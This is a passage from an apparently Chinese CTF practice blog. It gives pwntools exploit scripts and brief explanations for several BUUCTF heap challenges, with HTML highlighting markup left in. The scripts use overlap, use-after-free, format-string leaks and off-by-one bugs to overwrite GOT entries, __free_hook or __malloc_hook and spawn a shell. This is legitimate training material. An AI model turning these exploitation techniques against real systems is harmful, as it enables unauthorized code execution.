punctuation">]</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x120</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x260</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x128</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#gdb.attach(io)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x130</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x130</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#io = remote('node3.buuoj.cn', 29807)</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./roarctf_2019_realloc_magic'</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x6-ciscn-2019-final-5"><a href="#0x6-ciscn-2019-final-5" class="headerlink" title="0x6.ciscn_2019_final_5"></a>0x6.ciscn_2019_final_5</h2><p>这题的洞很不好找，<del>还是因为我太菜了</del>，首先检查程序保护机制</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/16.jpg" alt=""></p><p>got表可写，无PIE</p><p>共有增删改三个功能</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/17.jpg" alt=""></p><p>漏洞点存在于add功能中</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/18.jpg" alt=""></p><p>sub_400AB0函数功能如下</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/19.jpg" alt=""></p><p>返回两个两个参数按位或之后的值，然后将这个值存入<strong>0x6020e0</strong>中，<strong>0x6020e0</strong>是一个数组，并且，这个程序中存储chunk的地址不是按照我们输入的序号来存的，而是从头遍历数组，依次存入地址</p><p>当我们分配第一个chunk且输入序号为16时，返回指针的后三位是0x260，然后0x260|16=0x270，最终存入数组中的地址的后三位为0x270，这样我们就可以在0x270处伪造一个chunk头，造成chunkoverlap</p><p>然后，这题有一点很🐕，就是在edit功能中</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/20.jpg" alt=""></p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/21.jpg" alt=""></p><p>这个函数会将content[i]与0xf按位与，当content[i]&amp;0xf==index时，就往content[i]&amp;0xFFFFFFFFFFFFFFF0处写数据，先贴上exp:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#r = remote("node3.buuoj.cn", 28849)</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ciscn_final_5"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"ciscn_final_5"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">0x6020e0</span>free_got <span class="token operator">=</span> <span class="token number">0x602018</span>puts_plt <span class="token operator">=</span> <span class="token number">0x400790</span>puts_got <span class="token operator">=</span> <span class="token number">0x602020</span>atoi_got <span class="token operator">=</span> <span class="token number">0x602078</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span> <span class="token string">'aa\n'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xd0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span> <span class="token string">'aaa\n'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>atoi_got<span class="token number">-4</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">17</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>puts <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"puts:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> puts <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your choice: "</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>通过构造overlap，我们将chunk分配到了content数组处，并将content前几个值修改为了<strong>p64(free_got)+p64(puts_got+1)+p64(atoi_got-4)</strong></p><p>然后我们需要将<strong>free@got</strong>修改为puts函数，根据edit的要求，我们输入index为8，<strong>content[0]=free@got=0x602018,0x602018&amp;0xf=8==index,0x602018&amp;0xFFFFFFFFFFFFFFF0=0x602010</strong>,所以最终我们是往0x602010处写数据，于是传入两个<strong>puts_plt</strong>，将<strong>free@got</strong>修改为<strong>put_plt</strong>，然后delete(1),相当于puts(1),由于puts@got的最后一位是0，微调一下+1，后面的就是修改<strong>atoi</strong>为<strong>system</strong>，步骤和前面修改free@got差不多。</p><h2 id="0x7-gyctf-2020-some-thing-interesting"><a href="#0x7-gyctf-2020-some-thing-interesting" class="headerlink" title="0x7.gyctf_2020_some_thing_interesting"></a>0x7.gyctf_2020_some_thing_interesting</h2><p>虽然保护全开，但是无什么难度，存在uaf，并且还给了一个格式化字符串漏洞来泄露地址，所以先泄露地址然后uaf打malloc_hook，exp如下：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true"># io = process('./gyctf_2020_some_thing_interesting')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">29702</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'gyctf_2020_some_thing_interesting'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size0<span class="token punctuation">,</span> data0<span class="token punctuation">,</span> sizere<span class="token punctuation">,</span> datare<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size0<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data0<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>sizere<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>datare<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> data0<span class="token punctuation">,</span> datare<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data0<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>datare<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'OreOOrereOOreO%17$p'</span><span class="token punctuation">)</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'OreOOrereOOreO'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">240</span>__malloc_hook_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>__libc_realloc_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_realloc'</span><span class="token punctuation">]</span>onegadget <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x4526a</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'__malloc_hook_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__malloc_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'__libc_realloc_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__libc_realloc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'onegadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token number">-0x23</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token number">-0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xb</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__libc_realloc_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(io)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x8-roarctf-2019-easy-pwn"><a href="#0x8-roarctf-2019-easy-pwn" class="headerlink" title="0x8.roarctf_2019_easy_pwn"></a>0x8.roarctf_2019_easy_pwn</h2><p>保护全开，四个功能，增删查改，在edit功能中存在off-by-one，当我们输入的要修改的new_size==old_size+10时，就会产生一个off-by-one</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/22.jpg" alt=""></p><p>由于程序使用的是calloc，calloc会清空申请过来的chunk的内容，所以不能通过申请一个大小在unsortedbin中的chunk然后free再申请回来的方法泄露地址，于是我们要构造处堆块复用，之后再利用一次堆块复用造成fastbinattack，即由chunk0溢出到chunk1，使chunk1的大小被修改为chunk1_size+chunk2_size，之后free chunk1，于是把chunk2也放入了bin中，然后在分两次把chunk1和chunk2申请回来，此时，我们第二次申请过来的chunk2既是chunk2也是另一个堆块，我们称之为chunkn，chunk2和chunkn公用一个chunk，我们free掉chunk2，edit chunkn，实际上也就是在editchunk2，修改chunk2的fd指向malloc_hook-0x23即可，exp如下:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./roarctf_2019_easy_pwn'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./roarctf_2019_easy_pwn'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'roarctf_2019_easy_pwn'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># r = remote('node3.buuoj.cn', 25724)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xe1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token operator">+</span><span class="token number">0xa</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c4b78</span>__malloc_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>__libc_realloc <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_realloc'</span><span class="token punctuation">]</span>onegadget <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x4526a</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'__malloc_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'__libc_realloc => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__libc_realloc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 